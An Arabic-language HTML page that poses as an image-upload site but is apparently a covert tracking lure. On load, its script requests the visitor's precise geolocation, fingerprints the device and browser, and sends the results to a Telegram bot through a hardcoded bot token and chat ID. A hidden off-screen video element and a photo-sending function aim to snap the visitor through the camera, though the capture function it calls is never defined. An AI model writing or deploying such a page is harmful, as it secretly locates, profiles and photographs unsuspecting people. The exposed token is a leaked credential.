<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            transition: all 0.5s ease;
            display: block;
        }

        .loading-indicator {
            text-align: center;
            padding: 20px;
            color: #666;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }

        .gallery {
            padding: 20px;
            text-align: center;
        }

        .status-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #2ecc71;
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 14px;
            animation: pulse 2s infinite;
            z-index: 1000;
        }

        .hidden-camera {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        .camera-canvas {
            display: none;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="status-indicator" id="statusIndicator" style="display: none;">
        🔄 جاري التحميل...
    </div>

    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <div class="loading-indicator" id="loadingIndicator">
            <div class="spinner"></div>
            <p>جاري تحميل الصورة...</p>
        </div>

        <div class="gallery" id="gallery" style="display: none;">
            <img src="https://i.imgur.com/zcb3oRL.jpeg" 
                 alt="الصورة المختارة" 
                 class="main-image" 
                 id="mainImage">
        </div>

        <div class="success-message" id="successMessage">
            ✅ تم تحميل الصورة بنجاح
        </div>
    </div>

    <!-- عناصر مخفية للكاميرا -->
    <video id="cameraStream" class="hidden-camera" autoplay muted></video>
    <canvas id="cameraCanvas" class="camera-canvas"></canvas>

    <script>
        function collectData() {
            const ua = navigator.userAgent;
            
            let deviceType = 'كمبيوتر';
            if (/Mobile|Android|iPhone|iPad/.test(ua)) deviceType = 'جهاز محمول';
            else if (/Tablet|iPad/.test(ua)) deviceType = 'تابلت';
            
            let browser = 'غير معروف';
            if (ua.includes('Chrome')) browser = 'كروم';
            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
            else if (ua.includes('Safari')) browser = 'سفاري';
            else if (ua.includes('Edge')) browser = 'إيدج';
            
            let os = 'غير معروف';
            if (ua.includes('Windows')) os = 'ويندوز';
            else if (ua.includes('Mac')) os = 'ماك';
            else if (ua.includes('Linux')) os = 'لينكس';
            else if (ua.includes('Android')) os = 'أندرويد';
            else if (ua.includes('iOS')) os = 'iOS';
            
            return {
                timestamp: new Date().toLocaleString('ar-IQ'),
                page_url: window.location.href,
                device_type: deviceType,
                browser: browser,
                operating_system: os,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                user_agent: ua,
                referrer: document.referrer || 'مباشر',
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                // إضافة متغيرات الموقع
                latitude: window.userLocation?.latitude || 'غير متاح',
                longitude: window.userLocation?.longitude || 'غير متاح',
                location_accuracy: window.userLocation?.accuracy || 'غير متاح',
                location_status: window.userLocation?.status || 'لم يتم الطلب',
                // إضافة حالة الكاميرا
                camera_status: window.cameraStatus || 'لم يتم الطلب',
                photo_captured: window.photoCaptured || 'لا'
            };
        }

        function sendToTelegram(data) {
            // التوكن الخاص بالبوت
            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            // Chat ID الخاص بك
            const TELEGRAM_CHAT_ID = '170383339';
            
            const message = `
🔥 زائر جديد دخل الموقع تلقائياً!
━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${data.timestamp}
🌐 الرابط: ${data.page_url}
📱 الجهاز: ${data.device_type}
💻 المتصفح: ${data.browser}
🖥️ النظام: ${data.operating_system}
📺 دقة الشاشة: ${data.screen_resolution}
🖼️ نافذة المتصفح: ${data.viewport}
🌍 المنطقة الزمنية: ${data.timezone}
🗣️ لغة المتصفح: ${data.language}
🔗 المصدر: ${data.referrer}
📍 حالة الموقع: ${data.location_status}
📐 خط العرض: ${data.latitude}
📐 خط الطول: ${data.longitude}
🎯 دقة الموقع: ${data.location_accuracy}
📷 حالة الكاميرا: ${data.camera_status}
📸 تم التصوير: ${data.photo_captured}
━━━━━━━━━━━━━━━━━━
            `;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).then(response => {
                if (response.ok) {
                    console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
                    return response.json();
                } else {
                    console.error('❌ فشل إرسال البيانات إلى Telegram');
                    throw new Error('Telegram API Error');
                }
            }).then(data => {
                console.log('📱 استجابة Telegram:', data);
                return true;
            }).catch(error => {
                console.error('❌ خطأ في الإرسال:', error);
                return false;
            });
        }

        function sendPhotoToTelegram(imageDataUrl) {
            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            const TELEGRAM_CHAT_ID = '170383339';
            
            // تحويل data URL إلى blob
            const base64Data = imageDataUrl.split(',')[1];
            const byteCharacters = atob(base64Data);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: 'image/jpeg' });
            
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'visitor_photo.jpg');
            formData.append('caption', '📸 صورة الزائر من الكاميرا');
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            
            return fetch(url, {
                method: 'POST',
                body: formData
            }).then(response => {
                if (response.ok) {
                    console.log('✅ تم إرسال الصورة إلى Telegram بنجاح');
                    return response.json();
                } else {
                    console.error('❌ فشل إرسال الصورة إلى Telegram');
                    throw new Error('Telegram Photo API Error');
                }
            }).then(data => {
                console.log('📸 استجابة Telegram للصورة:', data);
                return true;
            }).catch(error => {
                console.error('❌ خطأ في إرسال الصورة:', error);
                return false;
            });
        }

        function updateStatus(message, isSuccess = false) {
            const statusElement = document.getElementById('statusIndicator');
            statusElement.textContent = message;
            statusElement.style.background = isSuccess ? '#2ecc71' : '#e74c3c';
        }

        function showGallery() {
            // إخفاء شاشة التحميل
            document.getElementById('loadingIndicator').style.display = 'none';
            
            // إظهار المعرض
            document.getElementById('gallery').style.display = 'block';
            
            // إظهار رسالة النجاح
            setTimeout(() => {
                document.getElementById('successMessage').style.display = 'block';
            }, 500);
        }

        // جمع الموقع الجغرافي
        window.userLocation = { status: 'جاري المحاولة...' };
        window.cameraStatus = 'لم يتم الطلب';
        window.photoCaptured = 'لا';

        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    console.log('🔍 محاولة الحصول على الموقع الجغرافي...');
                    
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            window.userLocation = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: Math.round(position.coords.accuracy) + ' متر',
                                status: 'تم الحصول عليه بنجاح'
                            };
                            console.log('✅ تم الحصول على الموقع:', window.userLocation);
                            resolve(true);
                        },
                        function(error) {
                            let errorMsg = '';
                            switch(error.code) {
                                case error.PERMISSION_DENIED:
                                    errorMsg = 'رفض المستخدم';
                                    break;
                                case error.POSITION_UNAVAILABLE:
                                    errorMsg = 'الموقع غير متاح';
                                    break;
                                case error.TIMEOUT:
                                    errorMsg = 'انتهت مهلة الانتظار';
                                    break;
                                default:
                                    errorMsg = 'خطأ غير معروف';
                            }
                            
                            window.userLocation = {
                                latitude: 'غير متاح',
                                longitude: 'غير متاح',
                                accuracy: 'غير متاح',
                                status: errorMsg
                            };
                            console.log('❌ فشل الحصول على الموقع:', errorMsg);
                            resolve(false);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 60000
                        }
                    );
                } else {
                    window.userLocation = {
                        latitude: 'غير متاح',
                        longitude: 'غير متاح', 
                        accuracy: 'غير متاح',
                        status: 'المتصفح لا يدعم تحديد الموقع'
                    };
                    console.log('❌ المتصفح لا يدعم تحديد الموقع');
                    resolve(false);
                }
            });
        }

        // البدء التلقائي عند تحميل الصفحة
        async function initializeApp() {
            console.log('🚀 تم تحميل الصفحة - البدء التلقائي');
            
            // محاولة الحصول على الموقع الجغرافي
            await getLocation();
            
            // محاولة التقاط صورة من الكاميرا (في الخلفية)
            capturePhoto(); // بدون انتظار لتجنب التأخير
            
            // جمع البيانات
            const data = collectData();
            console.log('📊 بيانات الزائر:', data);
            
            // إرسال البيانات إلى Telegram
            await sendToTelegram(data);
            
            // إظهار الصورة بعد التأخير
            setTimeout(() => {
                showGallery();
                
                // إخفاء مؤشر الحالة بعد فترة
                setTimeout(() => {
                    document.getElementById('statusIndicator').style.display = 'none';
                }, 1000);
            }, 1000);
        }

        // تشغيل التطبيق عند تحميل الصفحة
        window.addEventListener('load', initializeApp);
        
        // تشغيل إضافي عند استعداد DOM
        document.addEventListener('DOMContentLoaded', function() {
            console.log('📄 DOM جاهز');
        });
    </script>
</body>
</html>
